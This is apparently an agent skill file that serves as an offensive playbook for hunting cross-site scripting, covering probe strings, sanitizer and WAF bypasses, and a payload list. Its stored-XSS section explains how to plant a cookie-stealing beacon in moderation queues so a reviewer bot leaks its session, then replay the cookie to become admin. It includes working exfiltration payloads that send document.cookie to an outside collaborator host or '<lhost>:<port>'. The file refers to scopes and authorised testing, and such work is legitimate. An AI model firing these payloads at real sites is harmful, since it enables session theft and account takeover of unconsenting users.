---
name: hunt-xss
description: XSS hunting - reflected, stored, DOM-based. Marker discipline to avoid false positives. Blind-XSS beacons for stored contexts. SVG/markdown/redirect vectors. Wiki-first, FIND schema output.
---

# Hunt: XSS

**Assumes `hunt-core`** for the scope gate, two-account rule, confirmation gate, enumeration
limits, stop conditions, wiki protocol, FIND output, and Deadends. Marker discipline (unique 8+
char canaries, check the baseline first) lives in hunt-core.

## Wiki

```
qmd_query "XSS cross-site scripting DOM CSP bypass sanitizer" via wiki-search MCP
```

Hub: [[web-moc]] (live web index). Primary page: [[xss]]. Payload arsenals: `wiki/payloads/{xss,prototype-pollution}.md`.
Related client-side vectors: [[dangling-markup]] (scriptless HTML-injection exfil when script tags
are blocked), [[xssi]] (JSONP/script-inclusion info leak), [[browser-extension-attacks]]
(content-script/message-passing injection).

## Confirmation gate
NOT confirmation: payload URL-encoded or HTML-encoded in response, `<script>` appears as `&lt;script&gt;`, ASP.NET validator blocked `<`.
IS confirmation: HTTP/DNS request to your unique Collaborator subdomain with browser User-Agent (Mozilla/Chrome).

When you plant a blind/stored XSS beacon, append a row to `targets/<eng>/oob.md`: `| <token> | <sink url+param> | xss | <date> | waiting | |` (columns: token | sink | class | planted | status | source, where token = your unique Burp Collaborator / interactsh label). The recon-capture hook auto-correlates incoming callbacks to flip the row to HIT and SessionStart surfaces HITs; a HIT row is the confirmation gate to scaffold the FIND. Do NOT claim a blind XSS without a HIT row.

## Attack Surface Signals
High-value: admin panels (`*/admin`, `*/settings`), payment flows, stored wikis/labels/tags, SSO/signin pages, SVG upload endpoints.

**Approval / moderation workflow = the classic stored-XSS-to-privilege-escalation sink. Recognize it.**
When your submission "awaits review/approval by a moderator/admin" AND any field you control is rendered
back in a privileged panel (a pending-registrations queue, a report/ticket viewer, a comment-moderation
list, an order-approval screen), there is almost always a headless **reviewer bot** that opens that panel.
That is a blind-XSS delivery you get for free: plant a cookie/session beacon in the field and the reviewer's
session is exfiltrated -> replay their cookie -> you ARE the moderator/admin. The tell is often visible while
authed as a lower role or as admin: if the panel shows a prior submission's raw markup (an unescaped username
like `<x>` or `sqltest'...` sitting literally in the table), the sink is confirmed *without even firing a
payload* -- that raw reflection IS the stored-XSS proof, do not walk past it. This is frequently the INTENDED
path to the mid-tier (moderator) flag/role on a box that also has a heavier unintended route (LFI/RCE).

**Reviewer-bot + WAF stored-XSS gotchas (avoid the self-inflicted grind):**
- **If a public writeup / known payload exists, fire its EXACT form first** before inventing variants.
- **Obfuscate ONLY the blocked token, not the whole payload.** Submit each suspect token in
  isolation to learn exactly what the WAF rejects (often just the literal word `cookie`, or
  `onerror`/`<script>`). Keep everything else literal: `new Image().src='//IP/?x='+document['coo'+'kie']`
  (split only `cookie`, keep `document`) beats splitting `document` too. Over-obfuscation
  (`srcdoc`+`atob`+`.concat`+template-literals) usually breaks EXECUTION, not the WAF.
- **Prefer the simplest vector that passes the WAF AND runs in the bot.** A plain
  `<body onload="new Image().src=...">` beacon is more reliable than a `javascript:` iframe (modern
  headless Chrome blocks `javascript:`-iframe navigation) or `srcdoc` gymnastics.
- **Do NOT flood the moderation queue with test payloads.** The reviewer panel usually renders a
  LIMITED window; buried test messages never surface, so "no callback" becomes ambiguous (broken
  payload vs not-rendered). Submit ONE payload + a paired plain-`<img>` control in the SAME message
  (same render), so a callback disambiguates render-vs-execution. Iterate in a clean queue.
- Payload arsenal + WAF-token isolation examples: `wiki/payloads/xss.md`.

DOM XSS signals in JS:
```javascript
document.write(  innerHTML =  location.hash  location.search
eval(  $.html(  $(location  document.referrer
```

## Methodology
1. Map all reflection points - URL params, form fields, HTTP headers, file upload names
2. Classify: Reflected / Stored / DOM
3. Probe sanitizer: send `aaa"bbb'ccc<ddd` - observe which chars escaped
4. Test allowlisted tag combos: `<math><style>`, `<svg><style>`, `<iframe srcdoc>`
5. Hunt SVG upload vectors - often bypasses CSP
6. Test markdown/RDoc: `[text](javascript:alert(1))`, `link:javascript:`
7. Check redirect params: `?redirect=javascript:alert(1)`
8. Test UTM params: `utm_source`, `utm_medium` - often unsanitized on marketing pages
9. Plant blind-XSS beacons in admin-viewable fields: error messages, User-Agent, Referer, username, email
10. Validate in real browser before reporting
11. **Distill when confirmed** (per hunt-core): reusable sanitizer or CSP bypass, GENERIC, `python3 scripts/wiki-stage.py --kind technique --slug <slug> --target-page techniques/web/xss.md`.

## Key Payloads
```html
<!-- Context probe -->
aaa"bbb'ccc<ddd>eee`fff

<!-- Reflected baseline -->
"><script>alert(document.domain)</script>
<svg onload=alert(1)>

<!-- SVG (CSP bypass) -->
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>

<!-- Sanitizer bypass -->
<math><style><img src=x onerror=alert(1)></style></math>

<!-- Blind-XSS beacon (into a reviewer/approval field) -->
<svg onload=fetch('//bxss-<tag>.<collab>/x?c='+document.cookie)>

<!-- Filter-bypass beacon: word "cookie" blocked / <script>,<img> filtered / entity-encoded.
     Concatenate the property name + use iframe onload; exfil via new Image() (no fetch needed). -->
<iframe onload="new Image().src='//<lhost>:<port>/?x='+document['coo'+'kie']">
<!-- other separators when on\w+= is regex-filtered: <svg%0conload=...> (form feed), <svg/onload=...> -->

<!-- Markdown -->
[Click](javascript:alert(document.domain))
```

## Severity

Confirm in a real browser, not just Burp. FIND output and Deadends format per hunt-core:

- **high** - stored in an admin/privileged context, or session theft demonstrated.
- **medium** - reflected requiring a click.
- **low** - self-XSS with no chain.

Class deadend line: `- [ ] XSS on <host> <param> -- payload encoded/rejected, [detail]`.
